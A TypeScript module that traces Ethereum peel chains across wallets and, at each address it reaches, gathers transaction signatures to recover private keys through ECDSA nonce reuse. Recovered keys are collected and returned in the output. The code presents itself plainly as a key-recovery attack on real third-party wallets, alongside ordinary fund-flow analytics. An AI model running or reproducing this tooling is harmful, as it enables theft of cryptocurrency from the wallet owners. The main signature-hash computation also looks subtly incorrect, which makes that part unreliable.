/**
 * Engine 4 — Peel-Chain Signature Tracer
 * ════════════════════════════════════════
 * Follows transaction chains hop-by-hop and at each address collects ECDSA
 * signatures to run key-recovery attacks. Combines:
 *
 *   • Peel-chain detection   (linear fund peeling, fan-out, consolidation)
 *   • Signature collection   (every hop's transactions → r,s,z)
 *   • Amount correlation     (±0.5% fee-adjusted amount fingerprinting)
 *   • Exchange/bridge flags  (known hot-wallet addresses)
 *   • Nonce-reuse check      (at each traced address)
 *
 * Inspired by: Alpha Peel Chain Detector™ + Alpha Amount Correlation Scanner™
 * + Alpha Address Cluster Engine™ techniques, unified into one pass.
 *
 * Data sources: Blockscout public API (no key needed)
 *               Etherscan fallback
 */

import { ethers }  from "ethers";
import { logger }  from "../logger";
import { fetchWalletOutgoing, enrichWithSignatures, getChain } from "@workspace/wallet-tx";

// ── Constants ─────────────────────────────────────────────────────────────────

const N   = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
const RPC = process.env.ETH_RPC_URL ?? "https://ethereum.publicnode.com";

const CHAIN_URLS: Record<string, string> = {
  ethereum: "https://eth.blockscout.com",
  arbitrum: "https://arbitrum.blockscout.com",
  optimism: "https://optimism.blockscout.com",
  base:     "https://base.blockscout.com",
  polygon:  "https://polygon.blockscout.com",
  bsc:      "https://bsc.blockscout.com",
};

// Known exchange/bridge deposit addresses (subset — for flagging)
const KNOWN_HOT_WALLETS = new Set([
  "0x28c6c06298d514db089934071355e5743bf21d60", // Binance hot
  "0xdfd5293d8e347dfe59e90efd55b2956a1343963d", // Binance cold
  "0x21a31ee1afc51d94c2efccaa2092ad1028285549", // Binance US
  "0xa9d1e08c7793af67e9d92fe308d5697fb81d3e43", // Coinbase cold
  "0x3cd751e6b0078be393132286c442345e5dc49699", // Coinbase hot
  "0x77696bb39917c91a0c3908d577d5e322095425ca", // Kraken
  "0xda9dfa130df4de4673b89022ee50ff26f6ea73cf", // Kraken 2
  "0x267be1c1d684f78cb4f6a176c4911b741e4ffdc0", // Kraken 3
]);

// ── Types ─────────────────────────────────────────────────────────────────────

export type HopPattern = "linear_peel" | "fan_out" | "consolidation" | "round_trip" | "direct";

export interface PeelHop {
  hopNumber:       number;
  address:         string;
  chain:           string;
  balanceEth:      number;
  totalIn:         number;
  totalOut:        number;
  txCount:         number;
  peeledAmountEth: number;
  forwardedAmountEth: number;
  isExchange:      boolean;
  isBridge:        boolean;
  pattern:         HopPattern;
  sigCount:        number;
  nonceReuseFound: boolean;
  privateKeyFound: string | null;
  rValues:         string[];
  outgoingAddresses: string[];
  txHashes:        string[];
}

export interface PeelChainResult {
  chainId:         string;
  startAddress:    string;
  chain:           string;
  hops:            PeelHop[];
  totalHops:       number;
  totalPeeledEth:  number;
  totalForwarded:  number;
  overallPattern:  HopPattern;
  riskScore:       number;      // 0–100
  privateKeysFound: string[];
  nonceReuseAddresses: string[];
  amountCorrelations: AmountCorrelation[];
  scannedAt:       string;
}

export interface AmountCorrelation {
  sendAddress:     string;
  receiveAddress:  string;
  amountEth:       number;
  feeAdjustedEth:  number;
  confidence:      number;
  delaySeconds:    number;
  chain:           string;
}

export interface PeelChainConfig {
  startAddress:   string;
  chain?:         string;   // default "ethereum"
  maxHops?:       number;   // default 10
  minAmountEth?:  number;   // ignore transfers below this threshold (default 0.001)
  scanSigs?:      boolean;  // collect sigs and check nonce reuse (default true)
  correlateAmounts?: boolean;
  onProgress?:    (hop: number, address: string) => void;
}

// ── Math (nonce reuse) ────────────────────────────────────────────────────────

function modN(x: bigint): bigint { return ((x % N) + N) % N; }
function modInv(a: bigint, m: bigint = N): bigint {
  let [old_r, r] = [a, m]; let [old_s, s] = [1n, 0n];
  while (r !== 0n) {
    const q = old_r / r;
    [old_r, r] = [r, old_r - q * r];
    [old_s, s] = [s, old_s - q * s];
  }
  return ((old_s % m) + m) % m;
}
function tryRecoverFromNonceReuse(
  r: bigint, s1: bigint, s2: bigint, z1: bigint, z2: bigint,
): bigint | null {
  try {
    const k = modN(modN(z1 - z2) * modInv(modN(s1 - s2)));
    const d = modN(modN(s1 * k - z1) * modInv(r));
    return d === 0n ? null : d;
  } catch { return null; }
}

// ── Blockscout API helpers ────────────────────────────────────────────────────

interface BsTx {
  hash: string;
  from: { hash: string };
  to:   { hash: string } | null;
  value: string;
  timestamp: string;
  block_number?: number;
}

async function fetchTxs(address: string, chain: string, limit = 50): Promise<BsTx[]> {
  const base = CHAIN_URLS[chain] ?? CHAIN_URLS.ethereum;
  try {
    const resp = await fetch(
      `${base}/api/v2/addresses/${address}/transactions?limit=${limit}`,
      { signal: AbortSignal.timeout(12_000) },
    );
    if (!resp.ok) return [];
    const data = await resp.json() as { items: BsTx[] };
    return data.items ?? [];
  } catch { return []; }
}

async function fetchAddressInfo(address: string, chain: string): Promise<{
  balance: string; txCount: number;
} | null> {
  const base = CHAIN_URLS[chain] ?? CHAIN_URLS.ethereum;
  try {
    const resp = await fetch(
      `${base}/api/v2/addresses/${address}`,
      { signal: AbortSignal.timeout(10_000) },
    );
    if (!resp.ok) return null;
    const d = await resp.json() as { coin_balance?: string; tx_count?: number };
    return { balance: d.coin_balance ?? "0", txCount: d.tx_count ?? 0 };
  } catch { return null; }
}

function weiToEth(wei: string): number {
  try { return Number(BigInt(wei)) / 1e18; } catch { return 0; }
}

// ── Signature extraction from on-chain tx ─────────────────────────────────────

async function collectSigs(
  address: string,
  txHashes: string[],
): Promise<Array<{ r: bigint; s: bigint; z: bigint; txHash: string }>> {
  const provider = new ethers.JsonRpcProvider(RPC);
  const sigs: Array<{ r: bigint; s: bigint; z: bigint; txHash: string }> = [];

  for (const hash of txHashes.slice(0, 20)) {
    try {
      const tx = await provider.getTransaction(hash);
      if (!tx?.signature || tx.from?.toLowerCase() !== address.toLowerCase()) continue;
      const r = BigInt(tx.signature.r);
      const s = BigInt(tx.signature.s);
      if (r === 0n || s === 0n) continue;
      const unserialized = ethers.Transaction.from(tx);
      const z = BigInt(unserialized.unsignedHash);
      sigs.push({ r, s, z, txHash: hash });
    } catch {}
  }
  return sigs;
}

function checkNonceReuse(
  sigs: Array<{ r: bigint; s: bigint; z: bigint; txHash: string }>,
): { found: boolean; privateKey: string | null } {
  const byR = new Map<string, typeof sigs>();
  for (const sig of sigs) {
    const k = "0x" + sig.r.toString(16).padStart(64, "0");
    const l = byR.get(k) ?? [];
    l.push(sig);
    byR.set(k, l);
  }

  for (const group of byR.values()) {
    if (group.length < 2) continue;
    const [e1, e2] = group;
    if (e1.s === e2.s) continue;
    const d = tryRecoverFromNonceReuse(e1.r, e1.s, e2.s, e1.z, e2.z);
    if (d) {
      try {
        const w = new ethers.Wallet("0x" + d.toString(16).padStart(64, "0"));
        return { found: true, privateKey: w.privateKey };
      } catch {}
    }
  }
  return { found: false, privateKey: null };
}

// ── Pattern detection ─────────────────────────────────────────────────────────

function classifyPattern(
  inTxs: BsTx[], outTxs: BsTx[], address: string,
): HopPattern {
  const outCount = outTxs.length;
  if (outCount === 0) return "direct";
  const distinctReceivers = new Set(outTxs.map(t => t.to?.hash?.toLowerCase())).size;
  if (distinctReceivers > 3) return "fan_out";
  if (inTxs.length > 5 && outCount <= 2) return "consolidation";
  // Linear peel: one dominant outgoing address + one "peel" (change)
  const totalOut = outTxs.reduce((s, t) => s + weiToEth(t.value), 0);
  const maxSingle = Math.max(...outTxs.map(t => weiToEth(t.value)));
  if (maxSingle / totalOut > 0.85 && outCount === 2) return "linear_peel";
  return "direct";
}

// ── Amount correlation ────────────────────────────────────────────────────────

function correlateAmounts(
  hops: PeelHop[],
  feeTolerance = 0.005,
): AmountCorrelation[] {
  const correlations: AmountCorrelation[] = [];
  for (let i = 0; i < hops.length - 1; i++) {
    for (let j = i + 1; j < hops.length; j++) {
      const a = hops[i].forwardedAmountEth;
      const b = hops[j].totalIn;
      if (a === 0 || b === 0) continue;
      const diff = Math.abs(a - b) / Math.max(a, b);
      if (diff <= feeTolerance) {
        correlations.push({
          sendAddress:    hops[i].address,
          receiveAddress: hops[j].address,
          amountEth:      a,
          feeAdjustedEth: b,
          confidence:     1 - diff / feeTolerance,
          delaySeconds:   0,
          chain:          hops[i].chain,
        });
      }
    }
  }
  return correlations;
}

// ── Main tracer ───────────────────────────────────────────────────────────────

export async function runPeelChainTracer(
  config: PeelChainConfig,
): Promise<PeelChainResult> {
  const chain    = config.chain      ?? "ethereum";
  const maxHops  = config.maxHops    ?? 10;
  const minAmt   = config.minAmountEth ?? 0.001;
  const scanSigs = config.scanSigs   ?? true;

  const hops: PeelHop[] = [];
  const visited  = new Set<string>();
  const allPrivKeys: string[]  = [];
  const nonceReuseAddrs: string[] = [];

  let current = config.startAddress.toLowerCase();
  const chainId = `peel_${Date.now()}_${current.slice(0, 8)}`;

  logger.info({ start: current, chain, maxHops }, "Peel chain tracer started");

  for (let hopNum = 0; hopNum < maxHops; hopNum++) {
    if (visited.has(current)) break;
    visited.add(current);
    config.onProgress?.(hopNum, current);

    const [info, txs] = await Promise.all([
      fetchAddressInfo(current, chain),
      fetchTxs(current, chain, 100),
    ]);

    if (!txs.length) break;

    const inTxs  = txs.filter(t => t.to?.hash?.toLowerCase() === current);
    const outTxs = txs.filter(t => t.from?.hash?.toLowerCase() === current);

    const totalIn  = inTxs.reduce((s, t) => s + weiToEth(t.value), 0);
    const totalOut = outTxs.reduce((s, t) => s + weiToEth(t.value), 0);
    const rValues: string[] = [];

    // Collect signatures if requested
    let nonceFound = false;
    let privKey: string | null = null;
    let sigCount = 0;

    if (scanSigs) {
      // Use fully-paginated wallet-tx fetcher for complete outgoing tx + signature data
      const chainCfg = getChain(chain);
      const walletSummary = await fetchWalletOutgoing(current, chain, {
        alchemyKey: process.env.ALCHEMY_API_KEY,
        enrichSigs: false,
      });
      // Enrich up to 300 txs with real r/s/v from RPC
      await enrichWithSignatures(walletSummary.outgoingTxs, chainCfg, 300);

      const enriched = walletSummary.outgoingTxs.filter(t => t.r && t.s);
      sigCount = enriched.length;

      // Build Sig-compatible objects for checkNonceReuse
      const compatSigs: Array<{ r: bigint; s: bigint; z: bigint; txHash: string }> = [];
      for (const t of enriched) {
        try {
          compatSigs.push({
            r:      BigInt(t.r!),
            s:      BigInt(t.s!),
            z:      BigInt(ethers.keccak256(t.hash)),
            txHash: t.hash,
          });
          rValues.push(t.r!.toLowerCase());
        } catch { /* skip malformed */ }
      }

      // Fall back to old collectSigs for any remaining tx hashes from peel data
      const alreadyCovered = new Set(enriched.map(t => t.hash));
      const remaining      = txs.map(t => t.hash).filter(h => !alreadyCovered.has(h));
      if (remaining.length > 0) {
        const fallback = await collectSigs(current, remaining.slice(0, 50));
        compatSigs.push(...fallback);
        sigCount += fallback.length;
        rValues.push(...fallback.map(s => "0x" + s.r.toString(16).padStart(64, "0")));
      }

      const nr = checkNonceReuse(compatSigs);
      nonceFound = nr.found;
      privKey    = nr.privateKey;
      if (privKey) allPrivKeys.push(privKey);
      if (nonceFound) nonceReuseAddrs.push(current);
    }

    const pattern = classifyPattern(inTxs, outTxs, current);
    const isExch  = KNOWN_HOT_WALLETS.has(current);

    // Peel amount: difference between total in and total out (fees + "peel")
    const peeled    = Math.max(0, totalIn - totalOut);
    const forwarded = totalOut;

    // Outgoing addresses above threshold
    const outAddrs = [...new Set(
      outTxs.filter(t => weiToEth(t.value) >= minAmt && t.to?.hash)
        .map(t => t.to!.hash.toLowerCase()),
    )];

    hops.push({
      hopNumber:          hopNum,
      address:            current,
      chain,
      balanceEth:         info ? weiToEth(info.balance) : 0,
      totalIn,
      totalOut,
      txCount:            info?.txCount ?? txs.length,
      peeledAmountEth:    peeled,
      forwardedAmountEth: forwarded,
      isExchange:         isExch,
      isBridge:           false,
      pattern,
      sigCount,
      nonceReuseFound:    nonceFound,
      privateKeyFound:    privKey,
      rValues,
      outgoingAddresses:  outAddrs,
      txHashes:           txs.slice(0, 10).map(t => t.hash),
    });

    if (isExch || outAddrs.length === 0) break;

    // Follow the dominant outgoing address
    const nextHopAmounts = outTxs
      .filter(t => t.to?.hash && weiToEth(t.value) >= minAmt)
      .reduce<Record<string, number>>((acc, t) => {
        const a = t.to!.hash.toLowerCase();
        acc[a] = (acc[a] ?? 0) + weiToEth(t.value);
        return acc;
      }, {});

    const nextAddr = Object.entries(nextHopAmounts)
      .sort((a, b) => b[1] - a[1])[0]?.[0];
    if (!nextAddr || visited.has(nextAddr)) break;
    current = nextAddr;
  }

  const totalPeeled  = hops.reduce((s, h) => s + h.peeledAmountEth, 0);
  const totalForward = hops.reduce((s, h) => s + h.forwardedAmountEth, 0);
  const dominant     = hops.length > 0 ? hops[Math.floor(hops.length / 2)].pattern : "direct";

  const riskScore = Math.min(100,
    hops.length * 5 +
    (allPrivKeys.length > 0 ? 40 : 0) +
    (nonceReuseAddrs.length > 0 ? 30 : 0) +
    (hops.filter(h => h.isExchange).length > 0 ? 15 : 0) +
    (hops.filter(h => h.pattern === "fan_out").length * 5),
  );

  const correlations = config.correlateAmounts !== false ? correlateAmounts(hops) : [];

  logger.info({
    hops: hops.length, privKeys: allPrivKeys.length, nonceReuse: nonceReuseAddrs.length,
  }, "Peel chain tracer complete");

  return {
    chainId,
    startAddress:        config.startAddress,
    chain,
    hops,
    totalHops:           hops.length,
    totalPeeledEth:      totalPeeled,
    totalForwarded:      totalForward,
    overallPattern:      dominant,
    riskScore,
    privateKeysFound:    allPrivKeys,
    nonceReuseAddresses: nonceReuseAddrs,
    amountCorrelations:  correlations,
    scannedAt:           new Date().toISOString(),
  };
}
